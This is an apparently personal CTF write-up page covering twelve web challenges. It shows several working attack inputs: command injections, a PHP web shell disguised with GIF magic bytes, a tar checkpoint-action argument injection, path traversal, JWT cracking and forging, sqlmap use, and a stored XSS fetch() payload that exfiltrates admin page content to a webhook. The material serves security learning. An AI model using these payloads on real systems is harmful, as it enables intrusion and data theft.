@@ -1,0 +1,1163 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://UserLH1.github.io/cyber-writeups/Web_Security/">
+      
+      
+        <link rel="prev" href="../Forensics/">
+      
+      
+        <link rel="next" href="../Reverse_Engineering/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>Web Security - My CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web-security-write-ups" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="My CTF Writeups" class="md-header__button md-logo" aria-label="My CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Web Security
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../Forensics/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Forensics
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="./" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web Security
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../Reverse_Engineering/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Reverse Engineering
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../Blockchain_Crypto/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Blockchain & Crypto
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../Misc_Network/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Misc & Network
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="My CTF Writeups" class="md-nav__button md-logo" aria-label="My CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Forensics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forensics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-injector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Injector
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-web-intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Web-Intro
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-hisix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Hisix
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-manual-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Manual Review
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-tartarsausage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. TartarSausage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-file-crawler" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. File-Crawler
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-under-construction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Under Construction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-ping-station" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Ping Station
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-ping-station-v2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Ping Station v2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-small-data-leak" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Small Data Leak
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-random-web2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. Random-Web2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-authorization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12. Authorization
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reverse_Engineering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse Engineering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blockchain_Crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blockchain & Crypto
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc_Network/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc & Network
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-injector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Injector
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-web-intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Web-Intro
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-hisix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Hisix
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-manual-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Manual Review
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-tartarsausage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. TartarSausage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-file-crawler" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. File-Crawler
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-under-construction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Under Construction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-ping-station" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Ping Station
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-ping-station-v2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Ping Station v2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-small-data-leak" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Small Data Leak
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-random-web2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. Random-Web2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-authorization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12. Authorization
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="web-security-write-ups">Web Security Write-ups</h1>
+<h2 id="1-injector">1. Injector</h2>
+<p><strong>Challenge:</strong> A web page that executes ping commands.</p>
+<p><strong>Solution:</strong></p>
+<p>The URL <code>http://34.185.167.212:32229/index.php?host=127.0.0.1</code> returns <code>Command executed: ping -c 2 127.0.0.1</code>. This indicates <strong>Command Injection</strong>.</p>
+<p>I tried injecting <code>;ls</code> after the IP, which returned <code>flag.php</code> and <code>index.php</code>.</p>
+<p>By using <code>view-source:</code> or inspecting the page source after injecting <code>;cat flag.php</code>, I found the flag.</p>
+<p><strong>Flag:</strong> <code>CTF{C0mm4nd...}</code></p>
+<hr />
+<h2 id="2-web-intro">2. Web-Intro</h2>
+<p><strong>Challenge:</strong> Access Denied page with a cookie.</p>
+<p><strong>Solution:</strong></p>
+<p>The page has a session cookie. The first part is Base64 encoded. Decoding it reveals <code>{"logged_in":false}</code>.</p>
+<p>I changed it to <code>true</code>, re-encoded it to Base64, and used <strong>OWASP ZAP</strong> to modify the cookie header and resend the request.</p>
+<hr />
+<h2 id="3-hisix">3. Hisix</h2>
+<p><strong>Challenge:</strong> A PHP file upload form.</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>The form only appears if <code>?start</code> is present in the URL: <code>if (!isset($_GET['start'])){ show_source(__FILE__); exit; }</code>.</p>
+</li>
+<li>
+<p>The code converts the extension to lowercase for saving but checks the extension <em>before</em> conversion in a case-sensitive way. I bypassed the blacklist by naming the file <code>shell.PhP</code>.</p>
+</li>
+<li>
+<p>It checks for images using <code>getimagesize</code>. I bypassed this by adding <code>GIF89a;</code> (Magic Bytes) at the start of the file.</p>
+</li>
+<li>
+<p>Payload: <code>GIF89a; &lt;?php system($_GET['cmd']); ?&gt;</code>.</p>
+</li>
+<li>
+<p>Upload successful, but accessing the file showed only <code>GIF89a</code>. This means <code>system()</code> commands are blocked.</p>
+</li>
+<li>
+<p>I uploaded a new script using PHP native functions: <code>print_r(scandir("."));</code> to list files and <code>print_r(ini_get("disable_functions"));</code> to see blocked functions.</p>
+</li>
+<li>
+<p>Blocked functions included: <code>eval, exec, passthru, system</code>, etc.</p>
+</li>
+<li>
+<p>I extended the script to check the root <code>../</code> and <code>/home</code>. I found <code>flag.php</code> in the parent directory.</p>
+</li>
+<li>
+<p>I used <code>echo file_get_contents("../flag.php");</code> to read it. The flag was in the page source as a comment.</p>
+</li>
+</ol>
+<p><strong>Flag:</strong> <code>ctf{aaf15c...}</code></p>
+<hr />
+<h2 id="4-manual-review">4. Manual Review</h2>
+<p><strong>Challenge:</strong> IT Support Ticket System.</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>Registered an account and found a "Leave message for admins" feature (Ticket system). This suggests <strong>Stored XSS</strong>.</p>
+</li>
+<li>
+<p>Simple alert showed a CSRF token. I needed to impersonate the admin.</p>
+</li>
+<li>
+<p>I tried stealing cookies using an image payload pointing to my <strong>Webhook.site</strong>, but the cookies were likely HttpOnly or just CSRF tokens.</p>
+</li>
+<li>
+<p>I changed strategy to exfiltrate the entire page content the admin sees:</p>
+<p><code>javascript
+fetch('https://webhook.site/MY_LINK', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.body.innerHTML
+});</code></p>
+</li>
+<li>
+<p>The POST request received on my webhook contained the flag inside the <strong>User-Agent</strong> string of the bot.</p>
+</li>
+</ol>
+<p><strong>Flag:</strong> <code>ctf{4852d6...}</code></p>
+<hr />
+<h2 id="5-tartarsausage">5. TartarSausage</h2>
+<p><strong>Challenge:</strong> "Find the sausage and be a king of tar".</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>The upload form only accepts JPG/PNG. I uploaded a PHP shell renamed as a fake PNG (<code>fakeimg.png</code>).</p>
+</li>
+<li>
+<p>I found a hidden HTML page (<code>sadjwjaskdkwkasjdkwasdasdas.html</code>) titled "Enter tar". Inputting commands there failed.</p>
+</li>
+<li>
+<p>The server creates a TAR archive of uploaded files. TAR has a vulnerability using <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=cmd</code>.</p>
+</li>
+<li>
+<p>Normally, you upload files named <code>--checkpoint=1</code> to exploit this via wildcard <code>*</code>, but the upload filter enforced <code>.png</code> extensions, breaking this method.</p>
+</li>
+<li>
+<p>I realized I could inject arguments directly into the input field if the server command was <code>tar -cf archive.tar [USER_INPUT]</code>.</p>
+</li>
+<li>
+<p>Payload: <code>-cf arhiva.tar fakeimg.png --checkpoint=1 --checkpoint-action=exec="ls -la"</code>.</p>
+</li>
+<li>
+<p>The output (blind RCE) didn't show in the browser initially, but eventually, I got a file listing showing a directory with a very long Base64-like name.</p>
+</li>
+<li>
+<p>Accessing <code>that_long_folder/flag</code> revealed the flag.</p>
+</li>
+</ol>
+<hr />
+<h2 id="6-file-crawler">6. File-Crawler</h2>
+<p><strong>Challenge:</strong> An image viewer using parameters like <code>?image_name=static/path.jpg</code>.</p>
+<p><strong>Solution:</strong></p>
+<p>This is a <strong>Directory Traversal</strong> vulnerability. I tried escaping the folder using <code>../</code>.</p>
+<p>I used a payload like <code>image_name=../../../../tmp/flag</code> (no extension mentioned in the hint).</p>
+<p>The server downloaded a file named <code>flag</code> which contained the text.</p>
+<p><strong>Flag:</strong> <code>CTF{0caec4...}</code></p>
+<hr />
+<h2 id="7-under-construction">7. Under Construction</h2>
+<p><strong>Challenge:</strong> A website with a login and JWT session storage.</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>The user data in <code>localStorage</code> has an <code>id</code>, <code>username</code>, <code>role</code>, and <code>accessToken</code>.</p>
+</li>
+<li>
+<p>Modifying <code>localStorage</code> directly didn't work because the server verifies the JWT signature.</p>
+</li>
+<li>
+<p>Since the site is "under construction", I suspected a weak secret.</p>
+</li>
+<li>
+<p>I cracked the JWT secret using <strong>John the Ripper</strong>:</p>
+<p><code>bash
+john jwt.txt --format=HMAC-SHA256</code></p>
+</li>
+<li>
+<p><strong>Secret found:</strong> <code>letmein</code>.</p>
+</li>
+<li>
+<p>I forged a new admin JWT (changing ID to 1 or Role to Admin) signed with this secret.</p>
+</li>
+<li>
+<p>Accessing <code>/api/app/admin</code> with the forged token gave the flag.</p>
+</li>
+</ol>
+<p><strong>Flag:</strong> <code>CTF{e590d4...}</code></p>
+<hr />
+<h2 id="8-ping-station">8. Ping Station</h2>
+<p><strong>Challenge:</strong> Ping an IP address.</p>
+<p><strong>Solution:</strong></p>
+<p>Basic Command Injection. Inputting <code>127.0.0.1;ls</code> listed files. <code>127.0.0.1;cat flag</code> revealed the flag.</p>
+<p><strong>Flag:</strong> <code>ECSC{b1c0bc...}</code></p>
+<hr />
+<h2 id="9-ping-station-v2">9. Ping Station v2</h2>
+<p><strong>Challenge:</strong> Ping an IP, but letters are filtered.</p>
+<p><strong>Solution:</strong></p>
+<p>Trying <code>127.0.0.1;ls</code> failed due to validation. <code>127.0.0.1%0a</code> (newline) also errored. The challenge requires bypassing a WAF that blocks letters. </p>
+<p><em>(Solution pending/in progress in notes, likely involves wildcards <code>?</code> or octal bypass)</em></p>
+<hr />
+<h2 id="10-small-data-leak">10. Small Data Leak</h2>
+<p><strong>Challenge:</strong> A guest list app using Flask/SQLAlchemy. <code>ls</code> input triggers a SQL error.</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>The error <code>SELECT ... FROM guests WHERE guests.id = '1==1'</code> confirms SQL Injection.</p>
+</li>
+<li>
+<p>I used <strong>UNION SELECT</strong> to retrieve data. The query requires 3 columns.</p>
+</li>
+<li>
+<p>Trying to list tables from <code>information_schema.tables</code> resulted in empty rows (Flask rendering issue).</p>
+</li>
+<li>
+<p>I used <strong>SQLMap</strong> on Kali:</p>
+<p><code>bash
+sqlmap -u URL --dbs
+sqlmap -u URL --dbms=postgresql --tables --delay 1</code></p>
+<p><strong>Note:</strong> The <code>--delay 1</code> was crucial to avoid getting blocked.</p>
+</li>
+<li>
+<p>The list of tables contained one table named exactly as the flag: <code>ctf{57b234...}</code>.</p>
+</li>
+</ol>
+<hr />
+<h2 id="11-random-web2">11. Random-Web2</h2>
+<p><strong>Challenge:</strong> A blank page with <code>&lt;form&gt;</code>.</p>
+<p><strong>Solution:</strong></p>
+<ol>
+<li>
+<p>Adding <code>?source</code> revealed the PHP code.</p>
+</li>
+<li>
+<p>The code creates a sandbox folder based on <code>md5(session_id)</code>.</p>
+</li>
+<li>
+<p>It accepts a parameter <code>p</code>, truncates it to <strong>6 characters</strong>, and runs <code>system("wget -qO - " . $p);</code>.</p>
+</li>
+<li>
+<p>We need Command Injection within 6 chars.</p>
+</li>
+<li>
+<p><code>ls</code> showed <code>flag</code> and <code>index.php</code>.</p>
+</li>
+<li>
+<p>Tried <code>cat *f</code> or <code>sh f*</code>, but they were too long or failed.</p>
+</li>
+<li>
+<p>Tried executing via source <code>;. /f*</code> but it failed (likely because <code>flag</code> is not a valid script or is PHP).</p>
+</li>
+<li>
+<p><strong>Solution:</strong> Using <code>od</code> (Octal Dump) which is only 2 letters:</p>
+<p><code>?p=;od /*</code></p>
+<p>This output the file content in octal format. I used a Python script to split the spaces and convert octal to ASCII strings.</p>
+</li>
+</ol>
+<p><strong>Flag:</strong> <code>CTF{fc8155...}</code></p>
+<hr />
+<h2 id="12-authorization">12. Authorization</h2>
+<p><strong>Challenge:</strong> Blank page, 404 on <code>/admin</code>.</p>
+<p><strong>Solution:</strong></p>
+<p>Checking <code>robots.txt</code> showed a disallowed folder <code>/auth</code>. Accessing it gave "405 Method Not Allowed". </p>
+<p><em>(Further steps likely involve changing HTTP method to POST/PUT)</em></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.tabs", "navigation.sections", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
